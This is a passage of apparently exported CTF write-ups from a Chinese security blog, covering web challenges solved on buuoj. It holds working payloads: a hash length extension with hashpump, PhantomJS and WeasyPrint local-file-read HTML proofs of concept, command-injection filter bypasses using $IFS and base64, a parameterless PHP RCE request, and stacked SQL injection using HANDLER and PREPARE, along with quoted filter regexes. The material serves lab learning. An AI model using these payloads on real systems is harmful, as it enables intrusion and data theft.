json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>

<h3 id="解法一-哈希扩展攻击"><a href="#解法一-哈希扩展攻击" class="headerlink" title="解法一 哈希扩展攻击"></a>解法一 哈希扩展攻击</h3><ul>
<li>已知<code>md5(secert_key + &#39;flag.txt&#39; + &#39;scan&#39;)</code>的值，目标获取<code>md5(secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;)</code>的值</li>
<li>获取<code>md5(secert_key + &#39;flag.txt&#39; + &#39;scan&#39;)</code></li>
</ul>
<p><img data-src="./De1CTF_2019SSRF_Me/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a5183ebf48df1b314b96c605f6a2cb6b</span><br></pre></td></tr></table></figure>

<ul>
<li><code>hashpump</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/tmp# hashpump</span><br><span class="line">Input Signature: a5183ebf48df1b314b96c605f6a2cb6b</span><br><span class="line">Input Data: scan</span><br><span class="line">Input Key Length: 24</span><br><span class="line">Input Data to Add: read</span><br><span class="line">e76c2db7d05604e2e04d3e072827ce8b</span><br><span class="line"><span class="meta">scan%</span><span class="bash">80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./De1CTF_2019SSRF_Me/2.png" alt></p>
<h3 id="解法二-字符串拼接"><a href="#解法二-字符串拼接" class="headerlink" title="解法二 字符串拼接"></a>解法二 字符串拼接</h3><ul>
<li>代码逻辑如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">secert_key + param + action</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 构造 /geneSign?param=flag.txtread</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 此时 md5 为 secert_key + flag.txtread + scan</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 等价于 xxxflag.txtreadscan</span></span><br></pre></td></tr></table></figure>

<ul>
<li>获取<code>md5</code></li>
</ul>
<p><img data-src="./De1CTF_2019SSRF_Me/3.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">8e7810802cdfe6f94793339530afb7b2</span><br></pre></td></tr></table></figure>

<p><img data-src="./De1CTF_2019SSRF_Me/4.png" alt></p>
<h3 id="解法三-local-file协议绕过"><a href="#解法三-local-file协议绕过" class="headerlink" title="解法三 local_file协议绕过"></a>解法三 local_file协议绕过</h3><ul>
<li>获取<code>md5</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/geneSign?param=local_file:///app/flag.txtread</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">9dccdd5e0e48b98d8e6a480ee38f0062</span><br></pre></td></tr></table></figure>

<p><img data-src="./De1CTF_2019SSRF_Me/5.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
        <tag>哈希扩展攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>FBCTF2019ProductsManager</title>
    <url>/2021/03/17/blog_formal/security/CTF/FBCTF2019ProductsManager/</url>
    <content><![CDATA[<h1 id="FBCTF2019ProductsManager"><a href="#FBCTF2019ProductsManager" class="headerlink" title="FBCTF2019ProductsManager"></a>FBCTF2019ProductsManager</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>约束的<code>SQL</code>攻击</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./FBCTF2019ProductsManager/1.png" alt></p>
<ul>
<li>源码审计，发现存在<code>基于约束的SQL攻击</code></li>
</ul>
<p><img data-src="./FBCTF2019ProductsManager/2.png" alt></p>
<p><img data-src="./FBCTF2019ProductsManager/3.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>约束的SQL攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>FireshellCTF2020ScreenShooter</title>
    <url>/2021/03/16/blog_formal/security/CTF/FireshellCTF2020ScreenShooter/</url>
    <content><![CDATA[<h1 id="FireshellCTF2020ScreenShooter"><a href="#FireshellCTF2020ScreenShooter" class="headerlink" title="FireshellCTF2020ScreenShooter"></a>FireshellCTF2020ScreenShooter</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>文件包含</li>
<li><code>php</code>伪协议</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./FireshellCTF2020ScreenShooter/1.png" alt></p>
<ul>
<li>尝试<code>https://www.baidu.com</code></li>
</ul>
<p><img data-src="./FireshellCTF2020ScreenShooter/2.png" alt></p>
<ul>
<li>在线流量分析<a href="https://beeceptor.com/" target="_blank" rel="noopener">https://beeceptor.com/</a></li>
</ul>
<p><img data-src="./FireshellCTF2020ScreenShooter/3.png" alt></p>
<p>发现使用的是无头浏览器<code>PhantomJS/2.1.1</code> </p>
<ul>
<li><code>POC</code>(CVE-2019-17221)</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">var</span> karsa;</span></span><br><span class="line"><span class="actionscript">		karsa = <span class="keyword">new</span> XMLHttpRequest;</span></span><br><span class="line"><span class="actionscript">		karsa.onload = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText)</span></span><br><span class="line">		&#125;;</span><br><span class="line"><span class="actionscript">		karsa.open(<span class="string">"GET"</span>,<span class="string">"file:///flag"</span>);</span></span><br><span class="line">		karsa.send();</span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./FireshellCTF2020ScreenShooter/4.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
        <tag>php伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>FireshellCTF2020 URL TO PDF</title>
    <url>/2021/03/16/blog_formal/security/CTF/FireshellCTF2020URLTOPDF/</url>
    <content><![CDATA[<h1 id="FireshellCTF2020-URL-TO-PDF"><a href="#FireshellCTF2020-URL-TO-PDF" class="headerlink" title="FireshellCTF2020 URL TO PDF"></a>FireshellCTF2020 URL TO PDF</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>SSRF</code></li>
<li><code>binwalk</code></li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./FireshellCTF2020URLTOPDF/1.png" alt></p>
<ul>
<li>输入正确的<code>url</code>,返回<code>PDF</code>文件</li>
</ul>
<p><img data-src="./FireshellCTF2020URLTOPDF/2.png" alt></p>
<ul>
<li>流量分析</li>
</ul>
<p>​       在线网站<a href="https://beeceptor.com/" target="_blank" rel="noopener">https://beeceptor.com/</a></p>
<p><img data-src="./FireshellCTF2020URLTOPDF/3.png" alt></p>
<p>发现 <code>WeasyPrint 51</code></p>
<ul>
<li><code>POC</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"attachment"</span> <span class="attr">href</span>=<span class="string">"file:///flag"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>放到公网<code>VPS</code>上</p>
<p><img data-src="./FireshellCTF2020URLTOPDF/4.png" alt></p>
<ul>
<li>访问下载<code>pdf</code></li>
<li><code>binwalk -e</code> 查看</li>
</ul>
<p><img data-src="./FireshellCTF2020URLTOPDF/5.png" alt></p>
<p>存在附件</p>
<p><img data-src="./FireshellCTF2020URLTOPDF/6.png" alt></p>
<p><img data-src="./FireshellCTF2020URLTOPDF/7.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
        <tag>binwalk</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF2020老八小超市儿1</title>
    <url>/2021/01/19/blog_formal/security/CTF/GKCTF2020%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF1/</url>
    <content><![CDATA[<h1 id="GKCTF2020老八小超市儿1"><a href="#GKCTF2020老八小超市儿1" class="headerlink" title="GKCTF2020老八小超市儿1"></a>GKCTF2020老八小超市儿1</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>shopxocms getshell</code></li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页，发现为开源<code>CMS</code> <code>shopxo</code></li>
</ul>
<p><img data-src="./GKCTF2020%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF1/1.png" alt></p>
<ul>
<li>登入后台，尝试主题命令注入(默认密码<code>admin/shopxo</code>)</li>
</ul>
<p><img data-src="./GKCTF2020%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF1/2.png" alt></p>
<p><img data-src="./GKCTF2020%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF1/3.png" alt></p>
<ul>
<li>已知主题上传出存在 后台<code>getshell</code>问题</li>
</ul>
<p><img data-src="./GKCTF2020%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF1/4.png" alt></p>
<p><img data-src="./GKCTF2020%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF1/5.png" alt></p>
<ul>
<li>中国蚁剑</li>
</ul>
<p><img data-src="./GKCTF2020%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF1/6.png" alt></p>
<p><img data-src="./GKCTF2020%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF1/7.png" alt></p>
<ul>
<li>发现是一个假<code>flag</code></li>
<li>真的获取</li>
</ul>
<p><img data-src="./GKCTF2020%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF1/8.png" alt></p>
<p><img data-src="./GKCTF2020%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF1/9.png" alt></p>
<p><img data-src="./GKCTF2020%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF1/10.png" alt></p>
<p><img data-src="./GKCTF2020%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF1/11.png" alt></p>
<ul>
<li>等待一分钟后，刷新</li>
</ul>
<p><img data-src="./GKCTF2020%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF1/12.png" alt></p>
<p>拿到FLAG！</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>shopxocms</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019PingPingPing</title>
    <url>/2021/01/30/blog_formal/security/CTF/GXYCTF2019PingPingPing/</url>
    <content><![CDATA[<h1 id="GXYCTF2019PingPingPing"><a href="#GXYCTF2019PingPingPing" class="headerlink" title="GXYCTF2019PingPingPing"></a>GXYCTF2019PingPingPing</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>命令注入</li>
<li><code>base64</code> <code>空格</code>绕过</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./GXYCTF2019PingPingPing/1.png" alt></p>
<ul>
<li>存在命令执行</li>
</ul>
<p><img data-src="./GXYCTF2019PingPingPing/2.png" alt></p>
<p><img data-src="./GXYCTF2019PingPingPing/3.png" alt></p>
<ul>
<li>存在过滤</li>
</ul>
<p><img data-src="./GXYCTF2019PingPingPing/4.png" alt></p>
<ul>
<li>查看源码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://05edab5f-4204-445f-a076-9bb8557e5b09.node3.buuoj.cn/index.php?ip=127.0.0.1;cat$IFS$9index.php</span><br></pre></td></tr></table></figure>

<p><img data-src="./GXYCTF2019PingPingPing/5.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">|\<span class="string">'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/", $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/", $ip, $match);</span></span><br><span class="line"><span class="string">    die("fxck your symbol!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/ /", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your space!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/bash/", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your bash!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/.*f.*l.*a.*g.*/", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your flag!");</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec("ping -c 4 ".$ip);</span></span><br><span class="line"><span class="string">  echo "</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">";</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(base64<span class="variable">$IFS</span><span class="variable">$9</span>-d<span class="variable">$IFS</span><span class="variable">$9</span>&lt;&lt;&lt;<span class="variable">$IFS</span><span class="variable">$9</span><span class="string">"L2ZsYWc="</span>)</span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">IFS<span class="variable">$9</span>`<span class="built_in">echo</span><span class="variable">$IFS</span><span class="variable">$9ZmxhZy5waHA</span>=<span class="variable">$IFS</span><span class="variable">$9</span>|<span class="variable">$IFS</span><span class="variable">$9base64</span><span class="variable">$IFS</span><span class="variable">$9</span>-d`</span></span><br><span class="line">http://05edab5f-4204-445f-a076-9bb8557e5b09.node3.buuoj.cn/index.php?ip=127.0.0.1;cat$IFS$9`echo$IFS$9ZmxhZy5waHA=$IFS$9|$IFS$9base64$IFS$9-d`</span><br></pre></td></tr></table></figure>

<p><img data-src="./GXYCTF2019PingPingPing/6.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019_禁止套娃</title>
    <url>/2021/01/11/blog_formal/security/CTF/GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
    <content><![CDATA[<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="GXYCTF2019_禁止套娃"></a>GXYCTF2019_禁止套娃</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>githack</code></li>
<li>无参数<code>RCE</code></li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页发现，什么都没有</li>
</ul>
<p><img data-src="./GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/1.png" alt></p>
<ul>
<li>目录扫描后发现存在<code>.git</code>文件</li>
</ul>
<p><img data-src="./GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/2.png" alt></p>
<ul>
<li><code>githack</code>工具获取源码</li>
</ul>
<p><img data-src="./GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/3.png" alt></p>
<ul>
<li>拿到源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现是一道典型的无参数<code>RCE</code>,过滤了一些协议和关键字，并且无参数函数只能存在<code>a-z,_</code></p>
<ul>
<li>利用<code>session</code>攻击</li>
</ul>
<p><img data-src="./GXYCTF2019_%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/4.png" alt></p>
<p>数据包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /index.php?exp=show_source(session_id(session_start())); HTTP/1.1</span><br><span class="line">Host: xxxxxxxxxxxxxx.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>php无参数RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF2020Blacklist</title>
    <url>/2021/02/04/blog_formal/security/CTF/GYCTF2020Blacklist/</url>
    <content><![CDATA[<h1 id="GYCTF2020Blacklist"><a href="#GYCTF2020Blacklist" class="headerlink" title="GYCTF2020Blacklist"></a>GYCTF2020Blacklist</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>sql</code>注入</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./GYCTF2020Blacklist/1.png" alt></p>
<ul>
<li><code>sql</code>注入<code>fuzz</code></li>
</ul>
<p><img data-src="./GYCTF2020Blacklist/2.png" alt></p>
<p>发现过滤</p>
<p><img data-src="./GYCTF2020Blacklist/3.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;&#x2F;set|prepare|alter|rename|select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);</span><br></pre></td></tr></table></figure>

<ul>
<li>存在堆叠注入</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1'; show databases; -- qwe</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(11) "ctftraining"</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) "information_schema"</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) "mysql"</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) "performance_schema"</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(9) "supersqli"</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) "test"</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">1' and 1=2; show tables from supersqli; -- qwe</span><br><span class="line">1'; show tables; -- qwe</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(8) "FlagHere"</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) "words"</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">1' and 1=2; show columns from FlagHere; -- qwe</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) "flag"</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) "varchar(100)"</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) "NO"</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) ""</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) ""</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>flag</code>在<code>supersqli</code>-&gt;<code>FlagHere</code>-&gt;<code>flag</code></li>
</ul>
<hr>
<p>读取flag姿势</p>
<ul>
<li>通过<code>handler</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开一张表，无返回结果，实际上声明了一个名为tb1_name的句柄。</span></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</span></span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"><span class="meta">#</span><span class="bash"> 关闭打开的句柄。</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1' and 1=2; handler FlagHere open; handler FlagHere read first; -- qwe</span><br></pre></td></tr></table></figure>

<p><img data-src="./GYCTF2020Blacklist/4.png" alt></p>
<ul>
<li>通过预编译语句(不可以限制<code>PREPARE</code>字符串)</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SET;									# 用于设置变量名和值</span><br><span class="line">PREPARE stmt_name FROM preparable_stmt;	# 用于预备一个语句，并赋予名称，以后可以引用该语句</span><br><span class="line">EXECUTE stmt_name;			 			# 执行语句</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;	# 用来释放掉预处理的语句</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1' and 1=2; SET @test1 = concat('se', 'lect * from FlagHere;'); PREPARE stmt_name1 FROM @test1; EXECUTE stmt_name1; -- qwe</span><br></pre></td></tr></table></figure>

<ul>
